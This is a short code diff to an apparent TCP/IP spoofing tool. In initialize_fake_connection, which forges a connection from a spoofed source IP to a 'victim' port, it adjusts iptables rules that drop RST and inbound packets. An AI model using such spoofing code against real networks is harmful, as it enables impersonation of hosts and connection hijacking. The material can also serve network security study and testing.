@@ -168,6 +168,9 @@ def initialize_fake_connection(src_ip, dst_ip):
 	src_port = attacker_port
 	dst_port = victim_port
 
+	#terminal(f'sudo iptables -A OUTPUT -p tcp --tcp-flags RST RST --destination {dst_ip} -j DROP')
+	terminal(f'iptables -t raw -A PREROUTING -p tcp --dport {dst_port} -j DROP')
+
 	print(f'Spoofing with IP {src_ip}:{src_port} to IP {dst_ip}:{dst_port}')
 
 	mac_address = get_mac_address(network_interface)
@@ -175,7 +178,7 @@ def initialize_fake_connection(src_ip, dst_ip):
 
 	#ip_alias(src_ip)
 	#terminal(f'sudo iptables -A OUTPUT -p tcp --tcp-flags RST RST -s {src_ip} -j DROP')
-	terminal(f'sudo iptables -A OUTPUT -p tcp --tcp-flags RST RST --destination {dst_ip} -j DROP')
+
 	listener = TCPListener(src_ip)
 	s = TCPSocket(listener)
 	s.connect(dst_ip, dst_port)
